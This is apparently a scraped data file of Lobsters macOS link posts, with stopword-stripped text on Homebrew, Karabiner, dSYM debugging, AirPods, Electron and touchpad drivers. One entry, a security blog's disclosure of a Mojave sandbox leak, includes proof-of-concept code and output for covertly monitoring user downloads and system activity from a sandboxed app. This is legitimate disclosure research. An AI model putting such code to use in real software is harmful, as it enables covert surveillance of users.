solve problem quality thirdparty apps probably deserves post third party apps often lack quality thirdparty mac apps especially marketing site documentation side thing lot like window ui design language rarely reflected lot apps window store still illfated window metro ui general seems lack investment nice looking utility last year slight increase thirdparty app quality windowsonly apps good job mostly mac apps like tower ported window electron apps gruber hate probably work really well business would say probably opportunity people get positive attention shipping welldesigned window apps even progressive web apps window store flipside also curious happen mac app ecosystem apple partly responsible driving cost software zero already seeing apps switch webstyle saas subscription service mention io apps rumored heading desktop niche issue mac style special character smart quote special character intuitive feel missing window way currently type special character remember nonintuitive address system alt code oh need numpad work hard understand bad system aaron gustafson autohotkey config enable macstyle shortcut via thirdparty app personally like avoid thirdparty app know people success good news though window insider new emojikaomojisymbol picker make special character much accessible great see thing getting better like also see system level keybindings common punctuation save hand trip mouse list may different year window thing somewhat foundational user experience struggle window list long like said window keep getting better better biggest issue term productivity filesystem stuff expect wsl fast linux mean knowing big fundamental issue lingering asking question curious new window user former user miss mac however decided disable comment want weird window v mac rage fest going hit twitter better yet blog thought love know
232,Lobsters,mac,Apple macOS,Homebrew 1.9.0,https://brew.sh/2019/01/09/homebrew-1.9.0/,homebrew,tigerbrew homebrew formula option homebrewhomebrewcore,today like announce homebrew significant change since linux support optional automatic brew cleanup providing bottle binary package homebrew user major change deprecation since future major change deprecation coming homebrew officially support linux window window subsystem linux brew cleanup run periodically trigger individual formula cleanup reinstall install upgrade enable behaviour setting homebrewinstallcleanup variable homebrew run macos support see tigerbrew homebrew able create universal binary even tap homebrew longer migrate old installation legacy homebrewhomebrew repository homebrew formula option homebrewhomebrewcore option still supported encouraged thirdparty tap change since like highlight following finally thanks hardworking maintainer contributor sponsor supporter getting u far enjoy using homebrew
234,Lobsters,mac,Apple macOS,Matt cards for EFI ROM or unlocking MacBook,http://www.cmizapper.com/products/mattcard.html,matt card efi rom unlocking macbook,,buy ship world wideall item ship registered tracked mail
235,Lobsters,mac,Apple macOS,noah - Bash on Ubuntu on macOS,https://github.com/linux-noah/noah,noah bash ubuntu macos,noah noah experimental product academic paper quick start homebrew macports hacking hackingmd license,noah noah darwin subsystem linux bash ubuntu mac o x noah implemented hypervisor trap linux system call translates darwin system call noah also interpreter elf file binary executables linux run directly flawlessly without modification noah experimental product linux apps nt work well due missing system call technical detail please refer academic paper currently repository actively maintained might run latest macos quick start noah installed via homebrew macports first run noah automatically downloads installs comprehensive linux environment home directory default ubuntu installed noahtree macos sierra higher required homebrew brew install linuxnoahnoahnoah noah macports sudo port install noah noah hacking see hackingmd license dual mitlgpl file without explicit notation
236,Lobsters,mac,Apple macOS,Karabiner God Mode,https://medium.com/@nikitavoloboev/karabiner-god-mode-7407a5ddc8f6,karabiner god mode,karabiner old article goku us json special dsl defining first hyper key karabiner element readme short tutorial telegram chat dotfiles make cap lock great genuinely useful neovim actual god mode keyboard maestro alfred powerful workflow start writing workflow go km macro made use goku config line alfred learn anything workflow curated list alfred workflow go wild mine creator goku configuration one,karabiner low level macos kernel extension give virtual keyboard heavily customize likingi found power karabiner reading old article could remap cap lock key key actually useful could remap cap lock act escape key pressed alone fourfive key modifier held together article notion hyper dual purpose key born people seemed stopped article take idea hyper key apply every key keyboard using karabiner special dsl named goku make editing karabiner configuration breezekarabiner element us json define rule let program key various way powerful ability create custom hyper key like useful cap lock mentioned earlier applied every key keyboard enough talk praise game changing concept using computer try though let thatthe problem using json define karabiner rule get unwieldy complex nearly impossible edit hand gist karabiner configuration look like json format line long file inside definition make qwerty keyboard minus letter deletereturn key far hjkl hand position custom hyper key way sane person would open file try modify meaningful way contains much boilerplate karabiner actually need make magic really need point key want make hyper key point key inside hyper key would custom action run applescriptshellscriptopenapp fortunately problem solved creating special dsl minimum amount syntax needed define kind hyper key definition goku tool actually support karabiner element feature abstract away json mess deal line karabiner configuration written goku line file generates line json joy edit nice feature auto reloading config meaning soon press save goku config file keyboard modification applied instantlydefining first hyper keyif sparked interest reading article mac let try magic action see something may fancy computerlet install stuff need firstinstall karabiner element press big blue button install latest version install goku karabiner dsl brew install yqrashawngokugoku run goku service watch goku file instantly apply change brew service start goku open karabiner element alfredspotlight create default profilemore instruction goku work readme alongside short tutorial go feature also telegram chat ask help karabiner modification like makenow everything need installed running system get workgoku config file default life inside configkarabineredn since like keep useful config file dotfiles dir keep symlink original goku config placed inside dotfileskarabinerkarabinerednmake cap lock great againi cap lock mapped escape key pressed alone vim life held one actually quite easy especially since macos already provides ability map cap lock escape key system preferencesof course could done goku configuration since macos give u ability setting let use thatassuming done everything worked press cap lock key instead going cap lock mode trigger escape instead pretty useful given new macbooks even ship physical escape key although far away anyway touchbar genuinely useful holding onto cap lock key nothing useful let change thatopen configkarabineredn file favorite editor create exist edit config neovim paste inside save file simlayers capslockmode key capslock main de capskey rule capslockmode openbracket toopenbracket closebracket toclosebracket semicolon tosemicolon quote toquote comma tocomma period toperiod slash toslash toa b tob c toc tod e toe f tof g tog h toh toi j toj k tok l tol tom n ton p top q toq r tor tos tot u tou v tov w tow x tox toy z toz goku still tool beta unfortunately way check goku configuration worked without error type goku terminal get gokudone mean success mistake anywhere configuration get nasty stack trace usually mean forgot close bracketif get done like printed congratulation first hyper key hold cap lock press another key trigger anotherkey key default empty key map something let map one key one favorite mapping macosgo system preference keyboard shortcut service find search google action add shortcut press hold cap lock briefly cap lock still held press g key show hotkey screenshot belownow select text app press cap lock hold press g key everything worked make google query selected text pretty damn useful action finger tipshope got idea hyper key play bit get comfortable hold onto hyper key long trigger repeating escape key leave hyper key mode press cap lock key hold instantly whilst cap lock key held press activation key key keyboard case cap lock key activation key simply trigger hotkeys macos karabiner lot awesome powerful let take power limitsactual god modeto fully appreciate karabiner need buy use two powerful macos apps keyboard maestro alfredalfred programmable launcher macos like spotlight better search anything use wide array powerful workflow people built freely shared anyone use also wrote article start writing workflow gokeyboard maestro automation tool let create macro execute macro series action thing like shell scripting macos better make sense intuitive simple macro activates safari app macosi ran macro many time macro mapped nicely w k key w key hyper key k activation key instead boring hotkey run km macro km macro made use look goku config see line code template alfred osascript e tell application alfred run trigger workflow argument km osascript e tell application keyboard maestro engine script specifically line km osascript e tell application keyboard maestro engine script creates alias km call km macro name pas actually calling applescript code via osascript shell command man osascript like thing happens alfred osascript e tell application alfred run trigger workflow argument instead km macro call alfred workflow call alfred workflow applescript need thing external trigger name bundleid workflow trigger life found description workflow example calling specific alfred workflow goku n alfred search list nikivilearnanything although paste goku config defines happens n key pressed hyper key hyper key well defined block codefor example keyboard configuration activate alfred learn anything workflow pressing key pressing n key inside key layer code look like simlayers omode key de okey alfred rule omode n alfred search list nikivilearnanything goku syntax odd agree optimized typing le thus iterating config faster necessarily clarity short snippet actually defines hyper key hyper key life actual key type letter still type thing away like article writing ever want search curated list workflow press key briefly whilst releasing press n key get alfred prompt show programmed keyboard course actual key definition binding n key reality look like de okey alfred rule omode w cobackslash v spacebar alfred search pdf file nikivisearchfiles g alfred search snippet comrenfeisnippetslabalfredworkflow graveaccentandtilde alfred search process comvitorgalvaoalfredprocesscontrol e km make task r km make task safari title name q alfred search downloads recentdownloadsddjfreedom km current url note read b km task ask tab km current url note check h km current url note watch alfred search file nikivimanagewiki alfred search trash comvitorgalvaoalfreddirectories c alfred search emoji comgithubjsumnersalfredemoji alfred search tty session netisometryalfredtty f alfred search repos netdeanishealfredgitrepos n alfred search list nikivilearnanything alfred search list nikiviawesomelists alfred search clone comvitorgalvaoalfreddirectories alfred search desktop comvitorgalvaoalfreddirectories j alfred search km macro iansinnottkeyboardmaestro capslock alfred search folder nikivisearchfolders z alfred search workflow orgjeefworkflowdirectory k alfred search menu bar comtedwisemenubarsearch description okey alfred make sense key layer responsible calling various alfred workflow making layer mapping theme make thing easier remember example w key used activate used application look code de wkey apps rule wmode k km open safari h km open activity monitor km open chrome canary g km open bee km open trello spacebar comma km open spotify capslock km open finder km open tower b km open bettertouchtool r km open fantastical e open dash semicolon km open xcode period km open snippetslab f km open j km open iterm n km open sublime text l km open v code km open keyboard maestro layer instead alfred workflow calling km macro like one showed share km macro made use alongside alfred workflowsgo wildi using karabiner custom modifier key year still awe ability modify computer degree beyond powerful sad known public aside mine creator goku configuration seems one shame article change want live world everyone push boundary computer u
237,Lobsters,mac,Apple macOS,Attaching sources to iOS/macOS binaries compiled on another machine,https://medium.com/@maxraskin/background-1b4b6a9c65be,attaching source iosmacos binary compiled another machine,attaching source iosmacos binary compiled another machine background seeking solution stackoverflow little symbol iosmacos attaching dsym manually please http http wwwexamplecommystuffframeworkdsymzip found http lldbllvmorgsymbolshtml http update july script,attaching source iosmacos binary compiled another machinebackgroundour ci build several io framework deployed artifactory ready consumption clientsrecently framework crash used client naturally wanted attach offending app debugger step code ala trivially xcode simple way telling symbol source directory atseeking solutionnaturally went ahead google find proper solution turned stackoverflow put bounty questionsome time later received reply guy go name jim ingham quick search curiosity turn one lldb principal engineer apple awesome first order source knowledge little symbol iosmacosat first misconception enough symbolic source map data embedded debug binary framework thats enough fact data read either two place intermediate object file machine frame compiled ci machine case portable unless hack around shoudln dsym package generated debuginformationformat set dwarfwithdsymthis portable usable however absolute path source embedded itattaching dsym manuallyafter getting answer stackoverflow went ahead tried manual process attaching source simple follows dsym machinei started xcodeset breakpointlaunch appwhen breakpoint got hit typed following command lldb console adddsym pathtothedsymimage lookup vn someglobalsymbolzthis printed absolute path source code file symbol resides eg usersjenkinsmyprojectsrcsomeglobalsymbolsourcecppnow remap source path usedsettings set targetsourcemap usersjenkinsmyprojectsrcsomeglobalsymbolsourcecpp usersmaxmyprojectsrcsomeglobalsymbolsourcecppnote map multiple sourcemaps thus setting set targetsourcemap able step source symbol binary framework debug please process previous section tedious fun use time automated ityou grab python script http usage example python dsymsymbolizerpy dsymurl http wwwexamplecommystuffframeworkdsymzip sourcepath usersmemyselfandimystuffsources binarypath usersmemyselfandimyprojectpodsmystuffmystuffframeworka ruby version script found herethanks fellow coworker ben asher making ruby portnote ruby port requires dsymnow automation actually whats written previous section actually whats described http lldbllvmorgsymbolshtml guesstimation thrown script look binary try match embedded path local path using following algorithm downloads dsym remote urldsyms put dsymsexecutes nm utility binary guestimate embedded source path using following logic let assume sourcepath mypath potentialoriginalpath remoteplacefoobarbaz attempt see mypathbaz exists mypathbarbaz mypathfoobarbaz return generates mapping plist architecture mapping data put contentsresources within dsym packagehere example plist xml version encoding doctype plist public appledtd plist http plist version dict key dbgarchitecture key string string key dbgbuildsourcepath key string userssharedjenkinshomejobsmyappworkspacemyappcore string key dbgdsympath key string usersmaxdsymsmyappdsym string key dbgsourcepath key string usersmaxprojmyappmyappcore string key dbgsymbolrichexecutable key string usersmaxprojmyappmyappiospodsmylibcorelibmyappframeworkmyapp string dict plist run xcode lldb automatically pick dsym let debug binary machine note must rerun script binary get changed happy debugging update july also ruby port script thanks go coworker ben ashernote ruby port requires dsym local path
238,Lobsters,mac,Apple macOS,AirPods get stuck in low-quality 16 kHz audio mode when starting a VM,https://www.jeffgeerling.com/blog/2018/airpods-get-stuck-low-quality-16-khz-audio-mode-when-starting-vm,airpods get stuck lowquality khz audio mode starting vm,review airpods discovered left airpod bad audio midi setup answer airpods extremely poor mic quality mac,always love find really dumb solution work reliably fix problem never really problem first place worked audio device nothing nearly complex willing cut apple slack building seamless aural experience using airpods across phone call voip io device mac music apple tv hard execute perfectly said review airpods two year ago little earbuds close perfection come wireless sound solution someone like anyways problem sometimes maybe time run vagrant build local development environment one software project listening music airpods suddenly switch superlowquality audio mode sound like listening song played long subway tunnel something happening behind scene something vagrant virtualbox boot sequence making change computer assume control usb andor audio io seems audio mode used airpods happens sometimes situation sometimes airpods switch old pot voice call quality mode call stay even hang phone call often happens using airpods microphone voip apps apple pretty awesome little utility though help situation last year post discovered left airpod bad discovered handy bluetooth device diagnostics tool called bluetooth explorer long known essential builtin audio app mac around year audio midi setup name app mention music keyboard would nt know kind jackofalltrades come diagnosing configuring almost audio io aspect mac including surround sound input output microphone level output level specialized configuration midi really tiny part app app quickly highlight problem occurs airpods get stuck lowqualityoutput mode basically airpods get stuck playing bluetooth audio stream khz okay ish voice call sound terrible listening movie music anything really besides terrible quality audio stream radio happen three time found one solution nt require reboot work every time restoring pure khz audio stream airpods audio playing eg play song itunes open audio midi setup select airpods list device one out toggle format menu ch ch note blip audio m switch back keep audio midi setup open disconnect airpods mac using bluetooth menu reconnect airpods mac using bluetooth menu wait playing audio return still tinny yucky sounding quit audio midi setup audio midi setup quits audio switch khz mode idea hey work nt reboot entire mac listen audio originally posted fix answer stack overflow question airpods extremely poor mic quality mac thought post easily keep post updated time usually search blog quick fix like fix nt blog yet
240,Lobsters,mac,Apple macOS,Thoughts on (and pics of) the original Macintosh User Manual (2007),https://www.peterme.com/2007/08/27/thoughts-on-and-pics-of-the-original-macintosh-user-manual/,thought pic original macintosh user manual,ebay definite article appendix carrying case go introduction clicking dragging pretty straightforward probably want click detail,recently purchased original macintosh user manual thanks ebay seen one garage sale struck explain total paradigm shift interacting computer figured could learn something helping make innovation happen intriguing read remarkably handsome manual beautifully typeset considering par course time probably courier illustration saying something also even back definite article get phrase like macintosh charge one striking thing every chapter introduced fullcolor photo macintosh used click see bigger size appendix first thing appreciated macintosh set within somewhat normal quite varied context use noticed exception chapter every photo show preppy white male using computer woman people color need apply dude chapter even sweater around shoulder chapter exudes preppiness glass brick backdrop also keyboard chapter positioned like earth posed way anyway thing notice chapter maybe saw appendix infamous mac carrying case page photographed carrying case go introduction manual greets image introduction dig reflection apple returned reflection visual element year best stuff course explaining thing work clicking dragging pretty straightforward favorite scrolling imagine discussion well called scroll know let use drawing scroll yes people hey information go probably want click detail oh metaphor come perhaps strangest sentence finder like central hallway macintosh house disk guest someone looking bathroom surprisingly delightful flipping little bit computer history pace deliberateness system interface explained quite impressive
241,Lobsters,mac,Apple macOS,Concord: How I built a screen sharing application in two weeks,https://medium.com/@bradziolko/concord-how-i-built-a-screen-sharing-application-in-two-weeks-bef3f6a56ec4,concord built screen sharing application two week,concord built screen sharing application two week discovery phase depression phase,concord built screen sharing application two weeksa couple month ago searching screen sharing application collaborate friend software engineer trade naturally working couple side project given time finding decent screen sharing app turned much headache could imagined every app friend used consistently caveat rendered unusablethe discovery phasei sure many people tried using sort screen sharing app day bit mess either download application install plugin register countless account send friend invite even pay hefty premium quality still subparhangouts optimized screen sharing text blurry contains artifact way control qualityslack screen sharing premium feature slack serverskype discovered discord screen sharing feature giving try discovered quality good enough share detailed text however discord premium nitro nitro classic service one person gain ability stream high quality video number people decided give try worked well occasionally quality would degrade depending cpunetwork quality part handled streaming video legible text fairly easilythe depression phaseshortly following hunt purchased macbook upcoming io apps would developing docker window fuckery experienced story another time made easy choice essential one surprisingly enough gone life point without owning apple device even laptopalmost immediately discovered discord screen sharing capability crumbled ground shiny new mac generation core processor desktop handled streaming fine attempt core mac discrete gpu brought thing kneesi exaggerating starting camera screen share session rendered macos unusable every animation jittery typing behind massive input lag sharing screen editing text document look activity monitor indicated discord utilizing anywhere cpu
242,Lobsters,mac,Apple macOS,Memorizing passwords with Anki & 1Password,https://boinkor.net/2018/11/memorizing-passwords-with-anki-1password/,memorizing password anki,anki fluent forever password would even memorize arq diceware password set study deck anki deck study entry,recently started using anki spaced repetition scheduler lot learn french using fluent forever method setback pretty great experience overall seems super useful memorizing retaining sort information since memorize sort password phone unlock code laptop login password gym locker combination use help retain indeed well one problem trust always careful put password moment trust local macos keychain store secret safely protect breach instance ankiweb server breach attacker could read unencrypted password trust ankiweb app much since trust way maybe link anki see check password turn url scheme pretty welldocumented password would even memorize likely reader likely answer question password even obvious one one password one use unlock password vault definitely want forget probably want use sr ensure forget go thing unlock order bootstrap identity case catastrophic data loss think backup encryption password use arq type often secure rest data might saved keychain somewhere happens computer keychain blow probably want brain last least use memorize kind everyday secret kind annoying take phone computer look credit card atm pin code gym locker code sort thing course make memorization job easy possible use diceware password whenever much easier remember way set study deck setting deck really much work especially premade empty anki deck card type import start filling reference thing need memorize stepbystep guide order use url scheme effectively set advanced option first setting check setting enable copy uuid identify password need memorize ideally list short tagged memorize appear one place whatever work best download anki deck import anki appear memorize password contain single example card click deck anki overview click browse new window hit enter display example card see name uuid uuid identifies entry wish memorize secret example card belongs test password created blog post delete card useless close card browser click add anki deck view give new entry name open one entry want memorize select copy uuid back anki paste uuid uuid field repeat step secret want memorize let study study entry come magic part study deck anki ask password name given card say disk encryption password reveal answer give link take reveal password check answer right go back anki tell well got wrong got right easy work io macos version anki yet tested window version suspecthope work let know look macos app switching bit hassle believe best sure feel better storing important credential plaintext definitely better forgetting
243,Lobsters,mac,Apple macOS,Mojave's Sandbox is Leaky,https://objective-see.com/blog/blog_0x39.html,mojave sandbox leaky,become friend background documentation distributed notification sandbox globally sniffing distributed notification macos sandbox digita security conclusion,mojave sandbox leaky sidestepping poorly implemented protection significant privacy implication november research tool writing supported friend objectivesee today blog post brought become friend short blog post detail trivially exploitable privacy issue despite apple rather feeble attempt prevent allows sandboxed application surreptitiously spy unsuspecting user even latest version macos background security privacy point view sandbox excellent idea short within constraint properly designed implemented sandbox application largely limited variety way example amongst constraint arbitrarily access user file ie picture downloads capture keystroke subvert o hooray course sandbox implementation flaw allowing malicious application either escape sandbox completely still sandbox bypass specific sandbox constraint post dealing latter specifically sidestepping apple sandbox constraint distributed notification order gain valuable insight environment outside sandbox monitor private user o activity osxmacos allows application system component broadcast notification across task boundary aptly termed distributed notification event broadcast mean distributednotificationcenter class described distributed notification class documentation apple state class notification dispatch mechanism enables broadcast notification across task boundary specifically distributednotificationcenter instance broadcast nsnotification object object task registered notification default distributed notification center shortly see given time myriad interesting notification globally broadcast apps program system daemon tapping steam registering global distributed notification listener reveals lot going system well user globally register receive distributed notification simply invoke cfnotificationcenteraddobserver function shown nil name parameter callback specified invoked anytime distributed notification broadcast anyone code register global distributed notification listener note name parameter nil specify want listen notification callback invoked anytime anybody broadcast notification static void callback cfnotificationcenterref center void observer cfstringref namecf const void object cfdictionaryref userinfo nslog event bridge nsstring namecf nslog user info userinfo nslog object bridge id object return int main int argc const char argv register distributed notification note name nil mean cfnotificationcenteraddobserver cfnotificationcentergetdistributedcenter nil callback nil nil cfnotificationsuspensionbehaviordeliverimmediately nsrunloop currentrunloop run return note one also globally register receive distributed notification via nsdistributednotificationcenter method void addobserver id observer selector sel selector name nsnotificationname name object nsstring object suspensionbehavior nsnotificationsuspensionbehavior suspensionbehavior compile execute following code begin observing variety system event screen locksunlocks screen saver startstop bluetooth activity network activity user file downloads sniffsniff sniffsniff event comapplescreenislocked sniffsniff user info null sniffsniff object sniffsniff event comapplescreenisunlocked sniffsniff user info null sniffsniff object sniffsniff event comapplescreensaverdidlaunch sniffsniff user info null sniffsniff object null sniffsniff event comapplescreensaverdidstart sniffsniff user info runfrompref sniffsniff event comapplescreensaverwillstop sniffsniff user info null sniffsniff object null sniffsniff event comapplescreensaverdidstop sniffsniff user info runfrompref sniffsniff object null sniffsniff event iobluetoothdevicedisablescan sniffsniff user info null sniffsniff object null sniffsniff event sniffsniff user info null sniffsniff object null sniffsniff event comappledownloadfilefinished sniffsniff user info null sniffsniff object note value cfdictionaryref userinfo const void object parameter dependent notification example comappledownloadfilefinished notification object parameter contains name file downloaded design special permission needed register global listener well good however context sandbox obviously notification delivered global listener originating sandbox would least privacy point view clearly violate foundational concept sandbox isolation distributed notification sandbox apple clearly correctly realized privacy also possibly security point view sandboxed application able globally capture distributed notification sandboxed application attempt globally register distributed notification o sandbox rather sternly block action sniffsniff sniffsniff attempt register distributed notification thwarted sandboxing datetime mon nov o version application sniffsniff backtrace corefoundation cfgeneratereport corefoundation cfxnotificationregisterobserver corefoundation cfxnotificationregisterobserver foundation nsdistributednotificationcenter addobserver selector name object suspensionbehavior foundation nsdistributednotificationcenter addobserver selector name object sniffsniff appdelegate applicationdidfinishlaunching ok apple macos sandbox clearly seek prevent malicious application running sandbox globally sniffing distributed notification attempt register distributed notification thwarted sandboxing good unfortunately contrary apple pontifications seems security cupertino often approached rather lackadaisically word often really thought attempt block receiving distributed notification globally within sandbox perfect example globally sniffing distributed notification macos sandbox fully patched mojave box likely running version macos fails adequately prevent sandboxed application receiving possibly sensitive distributed notification though apple prevents application registering receive distributed notification globally passing nil name parameter nothing preventing sandboxed application registration receive notification name eg comappledownloadfilefinished thus malicious application trivially circumvent apple weak sandboxing attempt simply registering distributed notification directly name though take extra line code affect application cumulatively register receive capture distributed notification even within sandbox let look example say malicious application want monitor user downloads executed context macos sandbox normally something would strictly prohibited rightly definition sandbox seek provide isolated environment protecting user security privacy however registering receive comappledownloadfilefinished distributed notification name sandboxed application still surreptitiously monitor file user downloads first let sure sandbox malicious application sniffsniff write code listen comappledownloadfilefinished distributed notification static void callback cfnotificationcenterref center void observer cfstringref namecf const void object cfdictionaryref userinfo nslog event bridge nsstring namecf nslog user info userinfo nslog object bridge id object return void applicationdidfinishlaunching nsnotification anotification nsstring name comappledownloadfilefinished cfnotificationcenteraddobserver cfnotificationcentergetdistributedcenter nil callback cfstringref name nil cfnotificationsuspensionbehaviordeliverimmediately running sniffsniff within macos sandbox even fully patched mojave box rather surprisingly allows u surreptitiously monitor user downloads sniffsniff sniffsniff event comappledownloadfilefinished sniffsniff user info null sniffsniff object usersuserdownloadsthepeetapesmov note comappledownloadfilefinished distributed notification appears broadcast file downloaded user browser however includes downloaded incognito mode important note though monitor user downloads within sandbox actually read content file due sandboxing rule however file name rather must register notification name order circumvent sandbox protection valid question determine name notification interest ie comappledownloadfilefinished etc thought may comprehensive solution choose simply install global listener distributed notification course done outside sandbox simply observe notification name returning sandbox register notification interest name thought could utilize code mentioned earlier post instead made use powerful monitor capability digita security soon released monitorkit framework contains monitor globally observe distributed notification line code activate said monitor begin receive name broadcast distributed notification import cocoa import monitorkit nsapplicationmain class appdelegate nsobject nsapplicationdelegate func applicationdidfinishlaunching anotification notification call monitorkit enable distributed notification monitor let monitor distributednotifcationsmonitor monitorstart event print event eventnamerawvalue let userinfo eventuserinfo print event info userinfo let object eventobject print event object object note omg swift code know executing code reveals interesting distributed notification malicious sandboxed application could register observe newly installed application comapplelaunchservicesapplicationregistered event info anyhashable bundleids comobjectiveseeknockknock opened source code file comappledtxcodenotificationideeditorcoordinatordistributeddidcompletenotification event info anyhashable comappledtxcodeeditorcoordinatorcompletionfileurl userspatrickdocumentsgithubdonotdisturblaunchdaemonlaunchdaemonlidm anyhashable comappledtxcodeeditorcoordinatorcompletionreporterclass ideopenrequest application use comapplesharedfilelistchange event info anyhashable originatoraudittoken event object comapplelssharedfilelistapplicationrecentdocumentscomappleichat event info anyhashable originatoraudittoken event object comapplelssharedfilelistapplicationrecentdocumentscomappletextedit loaded kernel extension loaded kext notification kextarraykey comapplemessagebundleid comobjectiveseelulu comapplemessagekextname lulukext comapplemessagekextpath libraryextensionslulukext comapplemessagesignaturetype kext devid certificate download file comappledownloadfilefinished event object hid device comapplemultitouchsupporthiddeviceadded event info anyhashable device id anyhashable surface width mm anyhashable device type trackpad anyhashable supportsactuation anyhashable builtin anyhashable supportsforce anyhashable surface height mm anyhashable opaque bluetooth device comapplebluetoothstatus event info anyhashable anyhashable pageable anyhashable powerstate anyhashable address anyhashable estimatedbandwidthutilization anyhashable aclconnectioncount anyhashable hardwarename anyhashable connecteddevices address name apple trackpad productid sniffattempts vendorid address name bose quietcomfort productid sniffattempts vendorid address name logitech productid sniffattempts vendorid volume usb etc unmounts comappleunmountassistantprocessstart event info anyhashable volumeurl file volumestssciusb anyhashable volumerefnum note list distributed notification name comprehensive others uncovered conclusion macos sandbox explicitly designed prevent sandboxed application gaining insight private user system action apple clearly realized global distributed notification listener could thwart design goal thus attempted prevent attempt register distributed notification thwarted sandboxing unfortunately often case attempt really thought thru thus trivial circumvent simply registering notification name sandboxed application cumulatively register receive capture distributed notification allows violate core sandbox principle undermine user privacy performing action tracking install new application monitoring various file application use tracking loaded kexts observing user downloads thought imho issue constitute security vulnerability per se clearly violates design goal macos sandbox thus something cupertino surely attempt
244,Lobsters,mac,Apple macOS,Electron and the Decline of Native Apps,https://daringfireball.net/2018/12/electron_and_the_decline_of_native_apps,electron decline native apps,electron decline native apps swiftonsecurity regarding microsoft switch chromium window builtin rendering engine hig microsoft rick schaut wrote terrific piece whole saga back evermoreunmaclike web browser dreadfully bad apps noticed day ago support page page key scrolling strange tweeted regarding page downup thing design work,electron decline native apps friday december swiftonsecurity regarding microsoft switch chromium window builtin rendering engine chrome electronjs microsoft think edgehtml get dropin featureparity chromium replace electron apps whose duplication becoming significant performance drain want singleinstance electron fork electron cancer murdering macos window proliferates microsoft must offer dropin version native optimization improve performance resource utilization end desktop application nowhere javascript share depth pessimism regarding native apps electron without question scourge think mac prove resilient window mac platform attracts people care worry way worst thing ever happened mac got much popular decade ago theory nothing good news platform user mean attention developer mac user mac apps see problem user really care good native apps user know hig violation see care performance care mac apps right mostly already mac lot newer mac user either know care make good mac app always bad mac apps seldom achieved level popularity mac user collectively rejected microsoft word canonical example word mac beloved app solid mac citizen word crossplatform monstrosity mac user rejected rejection prompted microsoft height mid power arrogance completely rethink mac strategy create new business unit devoted mac microsoft rick schaut wrote terrific piece whole saga back ok mac word big slow relative memory computer available time shipped reason mac word crappy product least directly moreover people complained performance biggest complaint kept hearing mac word maclike spent lot time drilling people meant said maclike focus group u hung various usenet newsgroups talked product reviewer talked friend used product turn maclike meant mac word spent much time put much effort solving technical problem mac word failed make ui mac word behave like mac word thing figured result coming understand maclike meant going able deliver maclike product office remained singular product win mac version built mere fact maclike issue meant fundamental difference win word market mac word market understand market mac product win product needed separate marketing pgm organization lesson learned mac word reason mac bu exists today disagree strongly one aspect mac word user saw maclike whatever word word really maclike design word objected different objected literally unmaclike looked worked like word window unmaclike word far maclike google doc running inside chrome tab today google doc chrome unmaclike word processor running inside evermoreunmaclike web browser mac market flatly rejected unmaclike better mac market tolerates seemingly happily today software longer need maclike succeed mac today tragedy even apple company shipping mac apps glaring unmaclike problem marzipan apps macos mojave news home stock voice memo dreadfully bad apps functionally poor designwise foreignfeeling honestly understand apple decided ok ship apps another one ran mojave new mac app store app certainly look nice noticed day ago support page page key scrolling home end key jumping top bottom open article hit page instead scrolling beep beep say way scroll mouse trackpad app apple used nearly everyone even marzipan apps support key scrolling surprising support key standard behavior come free underlying developer framework mojave app store app must something strange key mojave app store app certainly written using electron problem electron apps really electron decline demand wellmade native mac apps ominous biggest threat mac ipads chromebooks window apathy towards make great mac apps great tweeted regarding page downup thing thing like canary coal mine regarding state mac even apple get basic fundamental like supporting page updown thing work scrolling view box expect developer new app store app mojave certainly look better developer apple company know design work
245,Lobsters,mac,Apple macOS,Making the best of MacBook Air touchpad on Ubuntu,https://int3ractive.com/2018/09/make-the-best-of-MacBook-touchpad-on-Ubuntu.html,making best macbook air touchpad ubuntu,blogged earlier libinput mtrack blog post compile install mtrack driver repo configure new touchpad driver driver github readme updated updated disable touchpad typing mtrack activity startup application mtrack look rule mtrack swipe swipe ctrl swipe ctrl swipe ctrl ctrl startup application updated reddit post final word,cover photo katarina šikuljak unsplash long time macbook air user recently switch linux bet one thing miss multitouch touchpad blogged earlier decided dual boot ubuntu macbook air first also struggled find best setup touchpad retain productivity rely much mouse post detailing touchpad setup feel best far close macos experience get although libinput default driver latest linux distros switch mtrack driver support many multitouch gesture flexible configuration especially three finger drag also main reason move thanks blog post got much faster head start still lot thing get current setup begin please noted mtrack currently support xorg environment fine since find wayland better term performance resource usage current ubuntu staying xorg default session ubuntu way compile install mtrack driver compile linux package might little scary newbie follow step carefully get know in out later first open terminal install necessary tool dependency compilation driver update ubuntu latest package sudo apt update sudo apt upgrade dependency noted default ubuntu sudo apt install buildessential git pkgconfig libmtdevdev mtdevtools xserverxorgdev xutilsdev clone source code compile mtrack driver currently active repo execute line line cd tmp git clone http cd configure withxorgmoduledirusrlibxorgmodules sudo make li kely able compile package sudo make command look carefully error message tell missing dependency stuck post comment see help finally install driver system sudo make install configure new touchpad driver new driver used proper config file set create config file root admin permission needed edit favorite text editor use command sudo touch sudo gedit open file gedit text editor proper permission save copy paste current mtrack config install mtrack driver save file config specialized macbook air section inputclass matchistouchpad identifier touchpads matchdevicepath devinputevent driver mtrack faster move distance pointer travel using polynomial profile option accelerationprofile tweak cursor movement speed option sensitivity pressure finger detected touch option fingerhigh pressure finger detected release option fingerlow often use thumb press physical button let ignore option ignorethumb false option thumbratio option thumbsize ignore palm palm take touch pad option ignorepalm true option palmsize trigger mouse button tap finger left click finger right click middle click option option option option option clicktime disable taptodrag using three finger drag instead option tapdragenable false touching touch pad finger press touchpad physical click button option option option option buttonmoveemulate false option buttonintegrated true momentum scroll finger released option scrollcoastduration option scrollcoastenablespeed natural scrolling two finger option scrollsmooth true option scrollupbutton option scrolldownbutton option scrollleftbutton option scrollrightbutton tweak scroll sensitivity scrolldistance nt touch scrollsensitivity option scrolldistance option scrollclicktime three finger drag option swipedistance option swipeleftbutton option swiperightbutton option swipeupbutton option swipedownbutton option swipeclicktime option swipesensitivity four finger swipe browser navigating back forth respectively option option mouse button used xorg map xbindkeys xdotool later option option mouse button triggered pinching gesture option scaledistance option scaleupbutton option scaledownbutton mouse button trigger rotating gesture disabled enhance pinch gesture option rotateleftbutton option rotaterightbutton endsection thing note config file config file tested macbook air likely need tweak cursor sensitivity option sensitivity replacing value value larger movement tweak finger scrolling sensitivity scrolldistance scroll swipe natural may swap button number want reverse click tap enabled want set tapbutton value config ignore thumb often press physical touchpad button thumb want ignore thumb set ignorethumb true want tweak head driver github readme read configuration instruction updated added accelerationprofile tweak sensitivity swipesensitivity make experience touchpad even closer macos updated another key point note forgot include first setup mtrack driver work add current linux user input group following command sudo adduser whoami input log log desktop know driver used drag make selection immediately three finger touchpad disable touchpad typing dispad using mtrack notice one annoying thing touchpad disabled typing make caret jump 